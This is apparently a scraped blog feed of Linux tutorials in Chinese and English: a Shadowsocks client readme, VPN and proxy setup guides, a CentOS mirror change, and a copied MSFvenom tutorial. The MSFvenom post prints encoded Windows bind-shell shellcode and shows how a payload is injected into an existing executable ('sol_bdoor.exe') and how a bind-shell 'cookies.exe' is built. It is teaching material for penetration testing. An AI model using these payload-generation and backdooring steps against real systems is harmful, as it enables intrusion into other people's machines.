      <url>http://www.linux52.com/2015-12-24-shadowscoke-e5-ae-a2-e6-88-b7-gui-e7-89-88.html</url>
      <content type="html"><![CDATA[<p><a href="https://github.com/shadowsocks/shadowsocks-gui" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-gui</a></p>
<p><a href="https://github.com/shadowsocks/shadowsocks-qt5/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-qt5/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97</a></p>
<h1 id="Shadowsocks-Qt5"><a href="#Shadowsocks-Qt5" class="headerlink" title="Shadowsocks-Qt5"></a>Shadowsocks-Qt5</h1><p>Please check <a href="https://github.com/librehat/shadowsocks-qt5/wiki" target="_blank" rel="external">project’s wiki</a> for “how-tos”.</p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a><a href="https://github.com/shadowsocks/shadowsocks-qt5#introduction" target="_blank" rel="external"></a>Introduction</h2><p>Shadowsocks-Qt5 is a native and cross-platform <a href="http://shadowsocks.org/" target="_blank" rel="external">shadowsocks</a> GUI client with advanced features.</p>
<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a><a href="https://github.com/shadowsocks/shadowsocks-qt5#features" target="_blank" rel="external"></a>Features</h2><ul>
<li>Shadowsocks-Qt5 is written in C++ with Qt 5.</li>
<li>Support traffic statistics</li>
<li>Support server latency (lag) test</li>
<li>Use multiple profiles simultaneously</li>
<li><code>config.ini</code> is located under <code>~/.config/shadowsocks-qt5/</code> on *nix platforms, or under the application’s directory on Windows.</li>
</ul>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a><a href="https://github.com/shadowsocks/shadowsocks-qt5#note" target="_blank" rel="external"></a>Note</h2><p>If <code>ss-qt5</code> crashes and the <strong>only one instance</strong> mode is checked, you may need to manually delete<code>/tmp/qipc_sharedmemory_ShadowsocksQt*</code> and <code>/tmp/qipc_systemsem_ShadowsocksQt*</code>. Otherwise, <code>ss-qt5</code> will complain that another instance is already running.</p>
<h2 id="LICENSE"><a href="#LICENSE" class="headerlink" title="LICENSE"></a><a href="https://github.com/shadowsocks/shadowsocks-qt5#license" target="_blank" rel="external"></a>LICENSE</h2><p>&nbsp;</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MSFvenom]]></title>
      <url>http://www.linux52.com/2015-12-22-msfvenom.html</url>
      <content type="html"><![CDATA[<p><a href="http://7xn6ev.com1.z0.glb.clouddn.com//wp-content/uploads/2015/12/201512220940305.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/12/201512220940305-300x203.png" alt="msfvenom-msfencode"></a></p>
<h2 id="Using-the-MSFvenom-Command-Line-Interface"><a href="#Using-the-MSFvenom-Command-Line-Interface" class="headerlink" title="Using the MSFvenom Command Line Interface"></a>Using the MSFvenom Command Line Interface</h2><p><strong>msfvenom</strong> is a combination of <em>Msfpayload and Msfencode</em>, putting both of these tools into a single Framework instance. Note: <a href="https://community.rapid7.com/community/metasploit/blog/2014/12/08/good-bye-msfpayload-and-msfencode" title="Metasploit Unleashed | Exploit Development : MSFVenom" target="_blank" rel="external"><em><strong>msfvenom</strong></em> has replaced both msfpayload and msfencode as of June 8th, 2015.</a></p>
<p>The advantages of msfvenom are:</p>
<ul>
<li>One single tool</li>
<li>Standardized command line options</li>
<li>Increased speed<br>Msfvenom has a wide range of options available:<br><pre id="pre-msfu">root@kali:~# msfvenom -h<br>MsfVenom - a Metasploit standalone payload generator.<br>Also a replacement for msfpayload and msfencode.<br>Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] &lt;var=val&gt;<br>Options:<br>-p, –payload &lt;payload&gt; Payload to use. Specify a ‘-‘ or stdin to use custom payloads<br> –payload-options List the payload’s standard options<br>-l, –list [type] List a module type. Options are: payloads, encoders, nops, all<br>-n, –nopsled &lt;length&gt; Prepend a nopsled of [length] size on to the payload<br>-f, –format &lt;format&gt; Output format (use –help-formats for a list)<br> –help-formats List available formats<br>-e, –encoder &lt;encoder&gt; The encoder to use<br>-a, –arch &lt;arch&gt; The architecture to use<br> –platform &lt;platform&gt; The platform of the payload<br>-s, –space &lt;length&gt; The maximum size of the resulting payload<br> –encoder-space &lt;length&gt; The maximum size of the encoded payload (defaults to the -s value)<br>-b, –bad-chars &lt;list&gt; The list of characters to avoid example: ‘x00xff’<br>-i, –iterations &lt;count&gt; The number of times to encode the payload<br>-c, –add-code &lt;path&gt; Specify an additional win32 shellcode file to include<br>-x, –template &lt;path&gt; Specify a custom executable file to use as a template<br>-k, –keep Preserve the template behavior and inject the payload as a new thread<br>-o, –out &lt;path&gt; Save the payload<br>-v, –var-name &lt;name&gt; Specify a custom variable name to use for certain output formats<br> –smallest Generate the smallest possible payload<br>-h, –help Show this message</pre></li>
</ul>
<p></p>
<h3 id="MSFvenom-command-line-usage"><a href="#MSFvenom-command-line-usage" class="headerlink" title="MSFvenom command line usage"></a>MSFvenom command line usage</h3><p>We can see an example of the msfvenom command line below and its output:</p>
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -i 3 -f python
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "xbbx78xd0x11xe9xdaxd8xd9x74x24xf4x58x31"
buf += "xc9xb1x59x31x58x13x83xc0x04x03x58x77x32"
buf += "xe4x53x15x11xeaxffxc0x91x2cx8bxd6xe9x94"
buf += "x47xdfxa3x79x2bx1cxc7x4cx78xb2xcbxfdx6e"
buf += "xc2x9dx53x59xa6x37xc3x57x11xc8x77x77x9e"
buf += "x6dxfcx58xbax82xf9xc0x9ax35x72x7dx01x9b"
buf += "xe7x31x16x82xf6xe2x89x89x75x67xf7xaaxae"
buf += "x73x88x3fxf5x6dx3dx9exabx06xdaxffx42x7a"
buf += "x63x6bx72x59xf6x58xa5xfex3fx0bx41xa0xf2"
buf += "xfex2dxc9x32x3dxd4x51xf7xa7x56xf8x69x08"
buf += "x4dx27x8ax2ex19x99x7cxfcx63xfax5cxd5xa8"
buf += "x1fxa8x9bx88xbbxa5x3cx8fx7fx38x45xd1x71"
buf += "x34x59x84xb0x97xa0x99xccxfex7fx37xe2x28"
buf += "xeax57x01xcfxf8x1ex1exd8xd3x05x67x73xf9"
buf += "x32xbbx76x8cx7cx2fxf6x29x0fxa5x36x2ex73"
buf += "xdex31xc3xfexaex49x64xd2x39xf1xf2xc7xa0"
buf += "x06xd3xf6x1axfex0axfex28xbex1ax42x9cxde"
buf += "x01x16x27xbdx29x1cxf8x7dx47x2cx68x06x0e"
buf += "x23x31xfex7dx58xe8x7bx76x4bxfexdbx17x51"
buf += "xfaxdfxffxa1xbcxc5x66x4bxeax23x86x47xb4"
buf += "xe7xd5x71x77x2ex24x4ax3dxb1x6fx12xf2xb2"
buf += "xd0x55xc9x23x2exc2xa5x73xb2xc8xb7x7dx6b"
buf += "x55x29xbcx26xddxf6xe3xf6x25xc6x5cxadx9c"
buf += "x9dx18x08x3bxbfxd2xffx92x18x5fx48x9bxe0"
buf += "x7bx03xa5x32x11x27x2bx25xcdx44xdbxbdxb9"
buf += "xcdx48xdax56x4cx56xd5x04x87x48x3ax6bx9c"
buf += "x2ax15x4dxbcx0bx56x06xb5xc9x46xd0xfax68"
buf += "xa6x76xe9x52x2cx24x62x28xe1x1dx87xb0x66"
buf += "x93x85x8fx87x0fxcfx16x29x76x03x55x0cx0e"
buf += "x3fx17xac"</pre>
The msfvenom command and resulting shellcode above generates a _Windows bind shell_ with three iterations of the_shikata_ga_nai encoder_ without any null bytes and in the python format.

### MSFvenom Platforms

Here is a list of available platforms one can enter when using the –platform switch.
<pre id="pre-msfu">Cisco or cisco
OSX or osx
Solaris or solaris
BSD or bsd
OpenBSD or openbsd
Firefox or firefox
BSDi or bsdi
NetBSD or netbsd
NodeJS or nodejs
FreeBSD or freebsd
Python or python
AIX or aix
JavaScript or javascript
HPUX or hpux
PHP or php
Irix or irix
Unix or unix
Linux or linux
Ruby or ruby
Java or java
Android or android
Netware or netware
Windows or windows
</pre>

<h3 id="MSFvenom-options-and-uses"><a href="#MSFvenom-options-and-uses" class="headerlink" title="MSFvenom options and uses"></a>MSFvenom options and uses</h3><p><strong>msfvenom -v or –var-name</strong></p>
<p>Usage: -v, –var-name &lt;name&gt;</p>
<p>Specify a custom variable name to use for certain output formats. Assigning a name will change the output’s variable from the default “buf” to whatever word you supplied.</p>
<p>Default output example:</p>
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
buf = ""
buf += "xdaxdcxd9x74x24xf4x5bxbaxc5x5exc1x6ax29"
&lt;snip&gt;</pre>
Using –var-name output example:
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python -v notBuf
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
notBuf = ""
notBuf += "xdaxd1xd9x74x24xf4xbfxf0x1fxb8x27x5a"
&lt;snip&gt;
</pre>
**msfvenom –help-format**
Issuing the msfvenom command with this switch will output all available payload formats.
<pre id="pre-msfu">root@kali:~# msfvenom --help-formats 
Executable formats
asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,
psh-cmd, vba, vba-exe, vba-psh, vbs, war
Transform formats 
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, 
powershell, ps1, py, python, raw, rb, ruby, sh,
vbapplication, vbscript</pre>
**msfvenom -n, –nopsled**
Sometimes you need to add a few NOPs at the start of your payload. This will place a nopsled of [length] size at the beginning of your payload.

BEFORE:
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none succeeded with size 299 (iteration=0)
generic/none chosen with final size 299
Payload size: 299 bytes
buf = ""
buf += "xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8b" **First line of payload
buf += "x50x30x8bx52x0cx8bx52x14x8bx72x28x0fxb7"
&lt;snip&gt;</pre>
AFTER:
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python -n 26
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none succeeded with size 299 (iteration=0)
generic/none chosen with final size 299
Successfully added NOP sled from x86/single_byte
Payload size: 325 bytes
buf = ""
buf += "x98xfdx40xf9x43x49x40x4ax98x49xfdx37x43" **NOPs
buf += "x42xf5x92x42x42x98xf8xd6x93xf5x92x3fx98"
buf += "xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8b" **First line of payload
&lt;snip&gt;</pre>
**msfvenom –smallest**
If the “smallest” switch is used, msfvevom will attempt to create the smallest shellcode possible using the
selected encoder and payload.
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
&lt;snip&gt;

root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python --smallest
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 312 (iteration=0)
x86/shikata_ga_nai chosen with final size 312
Payload size: 312 bytes
&lt;snip&gt;</pre>
**msfvenom -c, –add-code**
Specify an additional win32 shellcode file to include, essentially creating a two (2) or more payloads in one (1) shellcode.

Payload #1:
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw &gt; messageBox
No encoder or badchars specified, outputting raw payload
Payload size: 267 bytes
</pre>
Adding payload #2:
<pre id="pre-msfu">root@kali:~# msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw &gt; messageBox2
Adding shellcode from messageBox to the payload
No encoder or badchars specified, outputting raw payload
Payload size: 850 bytes</pre>
Adding payload #3:
<pre id="pre-msfu">root@kali:~# msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
Adding shellcode from messageBox2 to the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1469 bytes
Saved as: cookies.exe</pre>
Running the “cookies.exe” file will execute both message box payloads, as well as the bindshell using default settings (port 4444).

[![msfvenom_c_2](https://www.offensive-security.com/wp-content/uploads/2015/05/msfvenom_c_2-300x188.png)](https://www.offensive-security.com/wp-content/uploads/2015/05/msfvenom_c_2.png)

&nbsp;

**msfvenom -x, –template &amp; -k, –keep**
The -x, or –template, option is used to specify an existing executable to use as a template when creating your executable payload.
Using the -k, or –keep, option in conjunction will preserve the template’s normal behaviour and have your injected payload run as a separate thread.
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "x00" -f exe -o sol_bdoor.exe
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 299 (iteration=0)
x86/shikata_ga_nai chosen with final size 299
Payload size: 299 bytes
Saved as: sol_bdoor.exe</pre>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[kali 2.0 玩机姿势]]></title>
      <url>http://www.linux52.com/2015-12-22-kali-2-0-e7-8e-a9-e6-9c-ba-e5-a7-bf-e5-8a-bf.html</url>
      <content type="html"><![CDATA[<p>先来一个全面更新～<br>apt-get clean<br>apt-get update<br>apt-get upgrade<br>apt-get dist-upgrade<br>我觉得不要一味的去找阿里，中科大这些国内源，如果你觉得官方源的速度还可以，就不要换了，官方的是最可靠的。</p>
<p>卸载自带的iceweasl，安装firefox并汉化。<br>apt-get remove iceweasel<br>echo -e “\ndeb <a href="http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt" target="_blank" rel="external">http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt</a> all main” | tee -a /etc/apt/sources.list &gt; /dev/null</p>
<p><pre class="bbcode_code">apt-key adv –recv-keys –keyserver keyserver.ubuntu.com C1289A29</pre><br>apt-get update<br>apt-get install firefox-mozilla-build<br>这样就装好了，然后去这下载中文包<a href="http://ftp.mozilla.org/pub/firefox/releases/" target="_blank" rel="external">http://ftp.mozilla.org/pub/firefox/releases/</a><br>找到自己的版本，系统，在xpi文件夹有个zh_cn.xpi文件，下载就会提示安装了。</p>
<p>安装Flash插件：<br>apt-get install flashplugin-nonfree<br>update-flashplugin-nonfree –install<br>安装shadowsocks代理工具<br>apt-get install python-pip<br>pip install shadowsocks<br>相关配置：<a href="https://wiki.archlinux.org/index.php/Shadowsocks_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="external">shadowsocks详细配置</a></p>
<p>安装搜狗输入法～<br>apt-get install fcitx<br>到搜狗官网下载安装包：搜狗拼音for linux<br>cd /root/下载<br>dpkg -i 文件名.deb<br>reboot<br>配置神器vim～<br>贴出我的神级配置，研究了一天并借鉴了网上部分人的代码。<br>打开终端：<br>vim .vimrc //vim配置文件<br>//内容如下：<br>syntax on<br>set number<br>set nobackup<br>set cursorline<br>set autoindent<br>set cindent<br>set tabstop=4<br>set shiftwidth=4<br>set smartindent<br>set mouse=a<br>set showmatch<br>set incsearch<br>set nocompatible<br>set history=400<br>set makeprg=g++\ %\ -o\ /tmp/%&lt;<br>map ggvG”+y<br>map ggvG<br>map ggvG=</p>
<p>map :call CompileRunGpp()<br>func! CompileRunGpp()<br>exec “w”<br>exec “!clear”<br>exec “!g++ % -o /tmp/%&lt;.exe”<br>exec “! /tmp/%&lt;.exe”<br>endfunc</p>
<p>map :call Compile()<br>func! Compile()<br>exec “w”<br>exec “make”<br>exec “cw”<br>endfunc<br>实现了：<br>Ctrl+C 复制当前所有内容<br>Ctrl+A 全选<br>Ctr+Z 格式化所有代码（不是删除的意思。。）<br>F６ 编译，如有错误调用quickfix 可以快速查看错误的地方！<br>F7 编译并运行</p>
<p>不知不觉放出了大招！！</p>
<p>部分内容来源于互联网，大部分内容原创！转载请注明出处！</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[kali-linux安装shadowsocks]]></title>
      <url>http://www.linux52.com/2015-10-04-kali-linux-e5-ae-89-e8-a3-85shadowsocks.html</url>
      <content type="html"><![CDATA[<p>本来想架设的是ipsec的但是测试好多次都有各种问题 小菜我实在弄不明白</p>
<p>明明都能连接了 但只能访问20来秒。。好多机子上都是这样 感觉是资料太老了 要不就是机房封掉了协议</p>
<p>只有换方法shadowsocks总是行的</p>
<h2 id="CentOS、Debian下搭建shadowsocks-libev服务端"><a href="#CentOS、Debian下搭建shadowsocks-libev服务端" class="headerlink" title="CentOS、Debian下搭建shadowsocks-libev服务端"></a>CentOS、Debian下搭建shadowsocks-libev服务端</h2><p><span style="color: #ff0000;">centos</span> yum install build-essential autoconf libtool openssl-devel gcc -y<br><span style="color: #ff0000;">debain</span> apt-get install build-essential autoconf libtool libss-dev gcc -y</p>
<p>yum install git -y<br>apt-get install git -y</p>
<p><div id="crayon-55becbd30c013105258886-1" class="crayon-line">git clone <a href="https://github.com/madeye/shadowsocks-libev.git" target="_blank" rel="external">https://github.com/madeye/shadowsocks-libev.git</a></div></p>
<p><div id="crayon-55becbd30c013105258886-2" class="crayon-line crayon-striped-line">cd shadowsocks-libev</div></p>
<p><div class="crayon-line crayon-striped-line"> ./configure</div></p>
<p><div class="crayon-line crayon-striped-line"> make &amp;&amp; make install</div><br>比如：nohup /usr/local/bin/ss-server -s 自己的ip -p 端口 -k 密码 -m aes-256-cfb &amp;</p>
<p>加入开机启动</p>
<p>echo “nohup /usr/local/bin/ss-server -s 自己的ip -p 端口 -k 密码 -m aes-256-cfb &amp;”&gt;&gt;/etc/rc.local</p>
<p>&nbsp;</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[转-板瓦工Debian/Ubuntu PPTP VPN一键安装脚本]]></title>
      <url>http://www.linux52.com/2015-10-04-e8-bd-ac-e6-9d-bf-e7-93-a6-e5-b7-a5debianubuntu-pptp-vpn-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e8-84-9a-e6-9c-ac.html</url>
      <content type="html"><![CDATA[<p>【检查PPP模块】</p>
<p>root帐户，通过SSH登录到你的OpenVZ VPS，敲入：</p>
<p>cat /dev/ppp</p>
<p>如返回下面一行，则表示PPP模块是开启着的。</p>
<p>cat: /dev/ppp: No such device or address</p>
<p>如果不是，唔，联系你的主机商吧，一般都会给开启的；或在SolusVM管理面板中开启，或关闭再重新打开（按键具体叫什么名字忘了，反正是有的，汗～）。<br>【下载并运行脚本】<br>分别运行下面三行：</p>
<p>wget <a href="http://dadi.me/wp-content/uploads/dir/VPN/pptp_ovz_debian.sh" target="_blank" rel="external">http://dadi.me/wp-content/uploads/dir/VPN/pptp_ovz_debian.sh</a></p>
<p>chmod +x pptp_ovz_debian.sh</p>
<p>./pptp_ovz_debian.sh</p>
<p>下面是一些安装选项简介：<br>1) Set up new PoPToP server AND create one user</p>
<h1 id="键入1，回车、则安装PPTP服务，并创建一个用户。"><a href="#键入1，回车、则安装PPTP服务，并创建一个用户。" class="headerlink" title="键入1，回车、则安装PPTP服务，并创建一个用户。"></a>键入1，回车、则安装PPTP服务，并创建一个用户。</h1><p>2) Create additional users</p>
<h1 id="键入2，回车、则添加用户。"><a href="#键入2，回车、则添加用户。" class="headerlink" title="键入2，回车、则添加用户。"></a>键入2，回车、则添加用户。</h1><p>Enter username that you want to create (eg. vpn or dadi.me):</p>
<h1 id="需要创建的VPN登录所需的用户名。"><a href="#需要创建的VPN登录所需的用户名。" class="headerlink" title="需要创建的VPN登录所需的用户名。"></a>需要创建的VPN登录所需的用户名。</h1><p>Specify password that you want the server to use:</p>
<h1 id="对应VPN用户的密码。"><a href="#对应VPN用户的密码。" class="headerlink" title="对应VPN用户的密码。"></a>对应VPN用户的密码。</h1><p>最后输入密码之后就开始自动安装了，或是添加用户。<br>【额外】<br>如果有些网站不能访问，PPTP VPN安装之后，还需要在登录SSH后敲入并运行：</p>
<p>iptables -I FORWARD -p tcp –syn -i ppp+ -j TCPMSS –set-mss 1356</p>
<p>【结语】<br>运行之后，选择2，是添加用户；这一步骤适用于其他脚本安装的PPTP VPN，貌似L2TP也是可以的。</p>
<p>说到添加和管理用户，大地记得Webmin软件也是支持管理的，可以直接通过Web访问控制，添加或删除PPTP VPN用户。也简单，PPTP VPN安装之后，再正常步骤安装Webmin即可；有可能会在之后的文章中出现。<br>注意：这个安装脚本并不能运行在所有的OpenVZ架构的VPS上，大地在BandwagonHost这家的VPS上安装成功。推荐系统环境：Debian 5,6和Ubuntu 11.04。</p>
<p>=======================================================================</p>
<p>debain</p>
<p><pre class="bash">wget –no-check-certificate <a href="https://raw.githubusercontent.com/tennfy/debian_pptp_tennfy/master/debian_pptp_tennfy.sh" target="_blank" rel="external">https://raw.githubusercontent.com/tennfy/debian_pptp_tennfy/master/debian_pptp_tennfy.sh</a><br>chmod a+x debian_pptp_tennfy.sh</pre><br>./debian_pptp_tennfy.sh install</p>
<p>./debian_pptp_tennfy.sh adduser 添加<span class="wp_keywordlink_affiliate"><a href="http://www.tennfy.com/tag/pptp" title="查看 PPTP 中的全部文章" target="_blank" rel="external">PPTP</a></span> VPN账号密码</p>
<p>./debian_pptp_tennfy.sh repaire 如果出现619错误，那么执行</p>
<p>./debian_pptp_tennfy.sh uninstall</p>
<p><strong>注意：<span style="color: #ff0000;">下面</span></strong><span style="color: #ff0000;">脚本仅适用于 CentOS 6</span></p>
<p>&nbsp;</p>
<p>终端里运行以下命令（以root用户运行）：</p>
<p>cd /root<br>wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/across/master/pptp.sh" target="_blank" rel="external">https://raw.githubusercontent.com/teddysun/across/master/pptp.sh</a><br>chmod +x pptp.sh<br>./pptp.sh<br>整个安装过程一般不超过2分钟，甚至30秒搞定。脚本执行到最后会出现以下提示：</p>
<p>PPTP VPN service is installed.<br>ServerIP:your_server_IP<br>Username:vpn<br>Password:random password<br>Welcome to visit: <a href="http://teddysun.com/134.html" target="_blank" rel="external">http://teddysun.com/134.html</a></p>
<p>当然，这是预定义好的一个用户名（vpn）和密码（随机生成的6位字符串），要想增加用户怎么办呢？<br>很简单，用任一文本编辑器打开 /etc/ppp/chap-secrets，按照其中既有的用户格式添加即可。</p>
<p>VPN连接出现619错误的解决办法：<br>用文本编辑器打开/var/log/messages文件，找到这样的错误提示：<br>“GRE: read(fd=6,buffer=8059660,len=8196) from PTY failed: status = -1 error = Input/output error, usually caused by unexpected termination of pppd, check option syntax and pppd logs”<br>“CTRL: GRE read or PTY write failed (gre,pty)=(7,6)”<br>这说明是logwtmp这个配置选项出现问题，编辑/etc/pptpd.conf文件，注释掉logwtmp选项（前面加个#即可注释），重启pptpd服务。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CentOS更改yum源与更新系统]]></title>
      <url>http://www.linux52.com/2015-10-04-centos-e6-9b-b4-e6-94-b9yum-e6-ba-90-e4-b8-8e-e6-9b-b4-e6-96-b0-e7-b3-bb-e7-bb-9f.html</url>
      <content type="html"><![CDATA[<p>[1] 首先备份/etc/yum.repos.d/CentOS-Base.repo</p>
<div class="cnblogs_code"><br><pre>mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</pre><br></div><br>[2] 进入yum源配置文件所在文件夹<br><div class="cnblogs_code"><br><pre>[root@localhost yum.repos.d]# cd /etc/yum.repos.d/</pre><br></div><br>[3] 下载163的yum源配置文件，放入/etc/yum.repos.d/(操作前请做好相应备份)<br><div class="cnblogs_code"><br><pre>[root@localhost yum.repos.d]# wget <a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo" target="_blank" rel="external">http://mirrors.163.com/.help/CentOS6-Base-163.repo</a></pre><br></div><br>[4] 运行yum makecache生成缓存<br><div class="cnblogs_code"><br><pre>[root@localhost yum.repos.d]# yum makecache</pre><br></div><br>[5] 更新系统<br><div class="cnblogs_code"><br><pre>[root@localhost yum.repos.d]# yum -y update</pre><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CentOS安装L2TP VPN笔记]]></title>
      <url>http://www.linux52.com/2015-10-04-centos-e5-ae-89-e8-a3-85l2tp-vpn-e7-ac-94-e8-ae-b0.html</url>
      <content type="html"><![CDATA[<p>更新下源<a href="http://dg2016.duapp.com/archives/245" target="_blank" rel="external">http://dg2016.duapp.com/archives/245</a></p>
<p>首先需要卸载已安装的openswan，我因为yum install安装的openswan版本有bug，导致我折腾一天也没连接成功，所以建议直接下载指定版本的源码编译安装</p>
<h3 id="安装ipsec"><a href="#安装ipsec" class="headerlink" title="安装ipsec"></a>安装ipsec</h3><p><pre class="prettyprint linenums">yum remove -y openswan<br>wget –no-check-certificate <a href="https://download.openswan.org/openswan/old/openswan-2.6/openswan-2.6.38.tar.gz" target="_blank" rel="external">https://download.openswan.org/openswan/old/openswan-2.6/openswan-2.6.38.tar.gz</a><br>tar zxvf openswan-2.6.24.tar.gz<br>cd openswan-2.6.24<br>make programs install</pre></p>
<p>安装必须的模块<br></p>
<p><pre class="prettyprint linenums">yum install ppp iptables libpcap-devel<br></pre><br>配置ipsec /etc/ipsec.conf<br>[v_act]mv /etc/ipsec.conf /etc/ipsec.conf.bak&amp;&amp;vi /etc/ipsec.conf[/v_act]</p>
<p><pre class="prettyprint linenums">config setup<br>    nat_traversal=yes<br>    virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12<br>    oe=off<br>    protostack=netkey</pre></p>
<p>conn L2TP-PSK-NAT<br>    rightsubnet=vhost:%priv<br>    also=L2TP-PSK-noNAT</p>
<p>conn L2TP-PSK-noNAT<br>    authby=secret<br>    pfs=no<br>    auto=add<br>    keyingtries=3<br>    rekey=no<br>    ikelifetime=8h<br>    keylife=1h<br>    type=transport<br>    left=$ip  #替换成vps的ip<br>    leftprotoport=17/1701<br>    right=%any<br>    rightprotoport=17/%any<br><br>配置密钥<br>/etc/ipsec.d/l2tp.secrets</p>
<p><pre class="prettyprint linenums">xx.xx.xx.xx.xx %any: PSK “test” #你vps外网ip<br></pre><br>配置转发 /etc/sysctl.conf</p>
<p><pre class="prettyprint linenums">sed -i ‘s/net.ipv4.ip_forward = 0/net.ipv4.ip_forward = 1/g’ /etc/sysctl.conf<br>sysctl -p<br>for each in /proc/sys/net/ipv4/conf/*<br>do<br>echo 0 &gt; $each/accept_redirects<br>echo 0 &gt; $each/send_redirects<br>done<br>iptables -t nat -A POSTROUTING -j MASQUERADE<br></pre><br>验证ipsec配置</p>
<p><pre class="prettyprint linenums">/etc/init.d/ipsec restart<br>ipsec verify<br>Checking your system to see if IPsec got installed and started correctly:<br>Version check and ipsec on-path                                 [OK]<br>Linux Openswan U2.6.24/K2.6.32-71.29.1.el6.i686 (netkey)<br>Checking for IPsec support in kernel                            [OK]<br>NETKEY detected, testing for disabled ICMP send_redirects       [OK]<br>NETKEY detected, testing for disabled ICMP accept_redirects     [OK]<br>Checking for RSA private key (/etc/ipsec.secrets)               [OK]<br>Checking that pluto is running                                  [OK]<br>Pluto listening for IKE on udp 500                              [OK]<br>Pluto listening for NAT-T on udp 4500                           [OK]<br>Two or more interfaces found, checking IP forwarding            [OK]<br>Checking NAT and MASQUERADEing                                  [N/A]<br>Checking for ‘ip’ command                                       [OK]<br>Checking for ‘iptables’ command                                 [OK]<br>Opportunistic Encryption Support                                [DISABLED]<br></pre><br>安装x2ltpd</p>
<p><pre class="prettyprint linenums">wget <a href="http://www.xelerance.com/wp-content/uploads/software/xl2tpd/xl2tpd-1.3.0.tar.gz" target="_blank" rel="external">http://www.xelerance.com/wp-content/uploads/software/xl2tpd/xl2tpd-1.3.0.tar.gz</a><br>tar xvf xl2tpd-1.3.0.tar.gz<br>make install<br>mkdir /var/run/xl2tpd<br>ln -s /usr/local/sbin/l2tp-control /var/run/xl2tpd/l2tp-control<br>mkdir /etc/xl2tpd<br></pre><br>or</p>
<p><pre class="prettyprint linenums">wget <a href="http://dl.fedoraproject.org/pub/epel/6/i386/xl2tpd-1.3.6-2.el6.i686.rpm" target="_blank" rel="external">http://dl.fedoraproject.org/pub/epel/6/i386/xl2tpd-1.3.6-2.el6.i686.rpm</a><br>这个根据你自己的vps来包是在<a href="http://pkgs.org/上查找的" target="_blank" rel="external">http://pkgs.org/上查找的</a><br>rpm -Uvh xl2tpd-1.3.6-2.el6.i686.rpm<br>yum install xl2tpd<br></pre><br>修改/etc/xl2tpd/xl2tpd.conf</p>
